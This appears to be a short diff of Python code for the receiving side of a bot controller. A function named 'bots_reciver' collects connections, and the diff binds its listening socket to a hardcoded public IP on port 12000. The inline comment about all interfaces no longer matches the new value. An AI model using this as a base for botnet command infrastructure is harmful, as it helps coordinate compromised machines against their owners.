@@ -7,7 +7,7 @@ import json
 conn_list={}
 def bots_reciver():
     global conn_list
-    HOST = ''                 # Symbolic name meaning all available interfaces
+    HOST = '139.59.69.35'     # Symbolic name meaning all available interfaces
     PORT = 12000            # Arbitrary non-privileged port
     global count
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
